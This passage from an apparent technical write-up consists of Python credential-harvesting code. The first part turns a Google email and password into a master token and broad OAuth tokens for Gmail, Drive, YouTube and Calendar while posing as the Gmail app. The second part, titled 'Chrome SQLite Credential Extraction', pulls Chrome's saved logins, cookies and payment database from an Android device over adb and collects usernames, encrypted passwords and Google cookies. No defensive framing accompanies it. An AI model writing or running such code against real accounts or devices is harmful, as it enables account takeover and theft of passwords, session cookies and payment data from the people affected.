import gpsoauth

SCOPES = [
    'oauth2:https://www.googleapis.com/auth/plus.me',
    'oauth2:https://www.googleapis.com/auth/userinfo.email',
    'oauth2:https://www.googleapis.com/auth/drive',
    'oauth2:https://mail.google.com/',
    'oauth2:https://www.googleapis.com/auth/youtube',
    'oauth2:https://www.googleapis.com/auth/calendar'
]

def acquire_master_token(email: str, password: str, device_id: str) -> dict:
    res = gpsoauth.perform_master_login(email, password, device_id)
    master_token = res.get('Token')  # aas_et/... format
    oauth_tokens = {}
    for scope in SCOPES:
        token_res = gpsoauth.perform_oauth(email, master_token, device_id, scope,
                                           app='com.google.android.gm', client_sig='...')
        oauth_tokens[scope] = token_res.get('Auth')
    return {'master': master_token, 'oauth': oauth_tokens}
```

**Chrome SQLite Credential Extraction**:
```python
import sqlite3, subprocess

def extract_chrome_credentials(device_id: str) -> dict:
    """Pull Chrome databases and extract credentials"""
    dbs = {
        'login': '/data/data/com.android.chrome/app_chrome/Default/Login Data',
        'cookies': '/data/data/com.android.chrome/app_chrome/Default/Cookies',
        'payment': '/data/data/com.android.chrome/app_chrome/Default/Web Data'
    }
    harvested = {}
    for db_name, db_path in dbs.items():
        subprocess.run(['adb', '-s', device_id, 'pull', db_path, f'/tmp/{db_name}.db'])
        con = sqlite3.connect(f'/tmp/{db_name}.db')
        if db_name == 'login':
            rows = con.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall()
            harvested['logins'] = [{'url': r[0], 'user': r[1], 'pass_enc': r[2].hex()} for r in rows]
        elif db_name == 'cookies':
            rows = con.execute('SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE "%google%"').fetchall()
            harvested['google_cookies'] = [{'host': r[0], 'name': r[1]} for r in rows]
        con.close()
    return harvested
```

